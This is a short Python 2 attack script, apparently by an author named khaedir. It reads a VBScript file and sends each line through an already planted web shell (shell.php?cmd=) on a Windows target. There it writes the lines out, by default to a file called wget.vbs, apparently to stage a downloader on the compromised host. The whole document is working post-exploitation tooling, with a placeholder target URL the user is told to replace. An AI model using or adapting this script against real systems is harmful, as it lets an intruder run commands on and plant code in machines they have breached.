#!/usr/bin/python

import urllib2
import urllib
import argparse
'''
	@author : khaedir
	reads the vbs script each line and send to server.
	it will create vbsscript file as output
	vbscript run on windows base target
'''

def read_file(file):
	'''
	@param file
	return data list
	'''
	data = []
	f = open(file, 'r+')
	for line in f:
		data.append(line.strip())
	return data

def send_payload(url, data, output):
	req = urllib2.Request(url)
	req.add_header('User-agent', 'Mozilla/5.0')
	for line in data:
		fixline = "%s %s" %(line,output)
		print '[sending payload to the target]'
		r = urllib2.urlopen(url+urllib.quote(fixline))
		if r.code == 200:
			print "[Success]"

def main():
	
	output = ""

	parser = argparse.ArgumentParser()
	#positional arguments
	parser.add_argument("--file", help="load file that contain vbs script")
	parser.add_argument("--output", help="give the ouput filename on target system")
	args = parser.parse_args()

	if args.file == None or args.file == "":
		print "file harus di isi"
	elif args.output == None:
		output = "wget.vbs"
	else:
		output = args.output + ".vbs"
	
	fname = args.file

	filename 	 = fname
	data	 	 = read_file(filename)
	shell_url 	 = 'http://target.com/shell.php?cmd=' #change this to your shell url
	send_payload(shell_url, data, output)


if __name__ == '__main__':
	main()

